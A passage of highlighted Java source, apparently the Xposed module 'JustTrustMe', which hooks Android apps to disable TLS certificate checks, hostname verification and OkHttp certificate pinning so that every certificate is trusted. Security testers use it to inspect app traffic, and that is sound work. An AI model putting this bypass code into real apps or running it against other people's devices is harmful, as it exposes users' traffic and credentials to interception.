class="operator">=</span> <span class="string">&quot;JustTrustMe&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">currentPackageName</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        currentPackageName = lpparam.packageName;</span><br><span class="line">        <span class="comment">/* Apache Hooks */</span></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/impl/client/DefaultHttpClient.java */</span></span><br><span class="line">        <span class="comment">/* public DefaultHttpClient() */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking DefaultHTTPClient for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(DefaultHttpClient.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;defaultParams&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;connManager&quot;</span>, getSCCM());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/impl/client/DefaultHttpClient.java */</span></span><br><span class="line">        <span class="comment">/* public DefaultHttpClient(HttpParams params) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking DefaultHTTPClient(HttpParams) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(DefaultHttpClient.class, HttpParams.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;defaultParams&quot;</span>, (HttpParams) param.args[<span class="number">0</span>]);</span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;connManager&quot;</span>, getSCCM());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/impl/client/DefaultHttpClient.java */</span></span><br><span class="line">        <span class="comment">/* public DefaultHttpClient(ClientConnectionManager conman, HttpParams params) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking DefaultHTTPClient(ClientConnectionManager, HttpParams) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(DefaultHttpClient.class, ClientConnectionManager.class, HttpParams.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">HttpParams</span> <span class="variable">params</span> <span class="operator">=</span> (HttpParams) param.args[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;defaultParams&quot;</span>, params);</span><br><span class="line">                setObjectField(param.thisObject, <span class="string">&quot;connManager&quot;</span>, getCCM(param.args[<span class="number">0</span>], params));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/conn/ssl/SSLSocketFactory.java */</span></span><br><span class="line">        <span class="comment">/* public SSLSocketFactory( ... ) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking SSLSocketFactory(String, KeyStore, String, KeyStore) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookConstructor(SSLSocketFactory.class, String.class, KeyStore.class, String.class, KeyStore.class,</span><br><span class="line">                SecureRandom.class, HostNameResolver.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="type">String</span> <span class="variable">algorithm</span> <span class="operator">=</span> (String) param.args[<span class="number">0</span>];</span><br><span class="line">                        <span class="type">KeyStore</span> <span class="variable">keystore</span> <span class="operator">=</span> (KeyStore) param.args[<span class="number">1</span>];</span><br><span class="line">                        <span class="type">String</span> <span class="variable">keystorePassword</span> <span class="operator">=</span> (String) param.args[<span class="number">2</span>];</span><br><span class="line">                        <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> (SecureRandom) param.args[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">                        KeyManager[] keymanagers = <span class="literal">null</span>;</span><br><span class="line">                        TrustManager[] trustmanagers = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (keystore != <span class="literal">null</span>) &#123;</span><br><span class="line">                            keymanagers = (KeyManager[]) callStaticMethod(SSLSocketFactory.class, <span class="string">&quot;createKeyManagers&quot;</span>, keystore, keystorePassword);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        trustmanagers = <span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ImSureItsLegitTrustManager</span>()&#125;;</span><br><span class="line"></span><br><span class="line">                        setObjectField(param.thisObject, <span class="string">&quot;sslcontext&quot;</span>, SSLContext.getInstance(algorithm));</span><br><span class="line">                        callMethod(getObjectField(param.thisObject, <span class="string">&quot;sslcontext&quot;</span>), <span class="string">&quot;init&quot;</span>, keymanagers, trustmanagers, random);</span><br><span class="line">                        setObjectField(param.thisObject, <span class="string">&quot;socketfactory&quot;</span>,</span><br><span class="line">                                callMethod(getObjectField(param.thisObject, <span class="string">&quot;sslcontext&quot;</span>), <span class="string">&quot;getSocketFactory&quot;</span>));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/conn/ssl/SSLSocketFactory.java */</span></span><br><span class="line">        <span class="comment">/* public static SSLSocketFactory getSocketFactory() */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking static SSLSocketFactory(String, KeyStore, String, KeyStore) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;org.apache.http.conn.ssl.SSLSocketFactory&quot;</span>, lpparam.classLoader, <span class="string">&quot;getSocketFactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> (SSLSocketFactory) newInstance(SSLSocketFactory.class);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/conn/ssl/SSLSocketFactory.java */</span></span><br><span class="line">        <span class="comment">/* public boolean isSecure(Socket) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking SSLSocketFactory(Socket) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;org.apache.http.conn.ssl.SSLSocketFactory&quot;</span>, lpparam.classLoader, <span class="string">&quot;isSecure&quot;</span>, Socket.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* JSSE Hooks */</span></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/TrustManagerFactory.java */</span></span><br><span class="line">        <span class="comment">/* public final TrustManager[] getTrustManager() */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking TrustManagerFactory.getTrustManagers() for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.TrustManagerFactory&quot;</span>, lpparam.classLoader, <span class="string">&quot;getTrustManagers&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (hasTrustManagerImpl()) &#123;</span><br><span class="line">                    Class&lt;?&gt; cls = findClass(<span class="string">&quot;com.android.org.conscrypt.TrustManagerImpl&quot;</span>, lpparam.classLoader);</span><br><span class="line"></span><br><span class="line">                    TrustManager[] managers = (TrustManager[])param.getResult();</span><br><span class="line">                    <span class="keyword">if</span>(managers.length &gt; <span class="number">0</span> &amp;&amp; cls.isInstance(managers[<span class="number">0</span>]))</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                param.setResult(<span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ImSureItsLegitTrustManager</span>()&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/HttpsURLConnection.java */</span></span><br><span class="line">        <span class="comment">/* public void setDefaultHostnameVerifier(HostnameVerifier) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking HttpsURLConnection.setDefaultHostnameVerifier for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.HttpsURLConnection&quot;</span>, lpparam.classLoader, <span class="string">&quot;setDefaultHostnameVerifier&quot;</span>,</span><br><span class="line">                            HostnameVerifier.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/HttpsURLConnection.java */</span></span><br><span class="line">        <span class="comment">/* public void setSSLSocketFactory(SSLSocketFactory) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking HttpsURLConnection.setSSLSocketFactory for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.HttpsURLConnection&quot;</span>, lpparam.classLoader, <span class="string">&quot;setSSLSocketFactory&quot;</span>, javax.net.ssl.SSLSocketFactory.class,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/HttpsURLConnection.java */</span></span><br><span class="line">        <span class="comment">/* public void setHostnameVerifier(HostNameVerifier) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking HttpsURLConnection.setHostnameVerifier for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.HttpsURLConnection&quot;</span>, lpparam.classLoader, <span class="string">&quot;setHostnameVerifier&quot;</span>, HostnameVerifier.class,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* WebView Hooks */</span></span><br><span class="line">        <span class="comment">/* frameworks/base/core/java/android/webkit/WebViewClient.java */</span></span><br><span class="line">        <span class="comment">/* public void onReceivedSslError(Webview, SslErrorHandler, SslError) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking WebViewClient.onReceivedSslError(WebView, SslErrorHandler, SslError) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        findAndHookMethod(<span class="string">&quot;android.webkit.WebViewClient&quot;</span>, lpparam.classLoader, <span class="string">&quot;onReceivedSslError&quot;</span>,</span><br><span class="line">                              WebView.class, SslErrorHandler.class, SslError.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                ((android.webkit.SslErrorHandler)param.args[<span class="number">1</span>]).proceed();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* frameworks/base/core/java/android/webkit/WebViewClient.java */</span></span><br><span class="line">        <span class="comment">/* public void onReceivedError(WebView, int, String, String) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking WebViewClient.onReceivedSslError(WebView, int, string, string) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        findAndHookMethod(<span class="string">&quot;android.webkit.WebViewClient&quot;</span>, lpparam.classLoader, <span class="string">&quot;onReceivedError&quot;</span>,</span><br><span class="line">                            WebView.class, <span class="type">int</span>.class, String.class, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Multi-dex support: https://github.com/rovo89/XposedBridge/issues/30#issuecomment-68486449</span></span><br><span class="line">        findAndHookMethod(<span class="string">&quot;android.app.Application&quot;</span>,</span><br><span class="line">            lpparam.classLoader,</span><br><span class="line">            <span class="string">&quot;attach&quot;</span>,</span><br><span class="line">            Context.class,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="comment">// Hook OkHttp or third party libraries.</span></span><br><span class="line">                    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) param.args[<span class="number">0</span>];</span><br><span class="line">                    processOkHttp(context.getClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Only for newer devices should we try to hook TrustManagerImpl */</span></span><br><span class="line">        <span class="keyword">if</span> (hasTrustManagerImpl()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* external/conscrypt/src/platform/java/org/conscrypt/TrustManagerImpl.java#217 */</span></span><br><span class="line">            <span class="comment">/* public List&lt;X509Certificate&gt; checkServerTrusted(X509Certificate[] chain,</span></span><br><span class="line"><span class="comment">                                    String authType, String host) throws CertificateException */</span></span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Hooking com.android.org.conscrypt.TrustManagerImpl.checkServerTrusted(X509Certificate[]) for: &quot;</span> + currentPackageName);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;com.android.org.conscrypt.TrustManagerImpl&quot;</span>, lpparam.classLoader,</span><br><span class="line">                                <span class="string">&quot;checkServerTrusted&quot;</span>, X509Certificate[].class, String.class,</span><br><span class="line">                                String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    ArrayList&lt;X509Certificate&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;X509Certificate&gt;();</span><br><span class="line">                    <span class="keyword">return</span> list;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// End Hooks</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Helpers */</span></span><br><span class="line">    <span class="comment">// Check for TrustManagerImpl class</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasTrustManagerImpl</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.android.org.conscrypt.TrustManagerImpl&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Create a SingleClientConnManager that trusts everyone!</span></span><br><span class="line">    <span class="keyword">public</span> ClientConnectionManager <span class="title function_">getSCCM</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        KeyStore trustStore;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            trustStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">            trustStore.load(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">SSLSocketFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrustAllSSLSocketFactory</span>(trustStore);</span><br><span class="line">            sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);</span><br><span class="line"></span><br><span class="line">            <span class="type">SchemeRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SchemeRegistry</span>();</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;http&quot;</span>, PlainSocketFactory.getSocketFactory(), <span class="number">80</span>));</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;https&quot;</span>, sf, <span class="number">443</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ClientConnectionManager</span> <span class="variable">ccm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingleClientConnManager</span>(<span class="literal">null</span>, registry);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ccm;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//This function creates a ThreadSafeClientConnManager that trusts everyone!</span></span><br><span class="line">     <span class="keyword">public</span> ClientConnectionManager <span class="title function_">getTSCCM</span><span class="params">(HttpParams params)</span> &#123;</span><br><span class="line"></span><br><span class="line">        KeyStore trustStore;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            trustStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">            trustStore.load(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">SSLSocketFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrustAllSSLSocketFactory</span>(trustStore);</span><br><span class="line">            sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);</span><br><span class="line"></span><br><span class="line">            <span class="type">SchemeRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SchemeRegistry</span>();</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;http&quot;</span>, PlainSocketFactory.getSocketFactory(), <span class="number">80</span>));</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;https&quot;</span>, sf, <span class="number">443</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ClientConnectionManager</span> <span class="variable">ccm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadSafeClientConnManager</span>(params, registry);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ccm;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//This function determines what object we are dealing with.</span></span><br><span class="line">    <span class="keyword">public</span> ClientConnectionManager <span class="title function_">getCCM</span><span class="params">(Object o, HttpParams params)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> o.getClass().getSimpleName();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;SingleClientConnManager&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> getSCCM();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (className.equals(<span class="string">&quot;ThreadSafeClientConnManager&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> getTSCCM(params);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">processOkHttp</span><span class="params">(ClassLoader classLoader)</span> &#123;</span><br><span class="line">        <span class="comment">/* hooking OKHTTP by SQUAREUP */</span></span><br><span class="line">        <span class="comment">/* com/squareup/okhttp/CertificatePinner.java available online @ https://github.com/square/okhttp/blob/master/okhttp/src/main/java/com/squareup/okhttp/CertificatePinner.java */</span></span><br><span class="line">        <span class="comment">/* public void check(String hostname, List&lt;Certificate&gt; peerCertificates) throws SSLPeerUnverifiedException&#123;&#125;*/</span></span><br><span class="line">        <span class="comment">/* Either returns true or a exception so blanket return true */</span></span><br><span class="line">        <span class="comment">/* Tested against version 2.5 */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking com.squareup.okhttp.CertificatePinner.check(String,List) (2.5) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;com.squareup.okhttp.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;com.squareup.okhttp.CertificatePinner&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;check&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                List.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 2.5 not found in &quot;</span>  + currentPackageName  + <span class="string">&quot;-- not hooking&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/CertificatePinner.java#L144</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking okhttp3.CertificatePinner.check(String,List) (3.x) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;check&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                List.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                javax.net.ssl.SSLSession.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking OkHostnameVerifier.verify(String, SSLSession)&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                java.security.cert.X509Certificate.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> 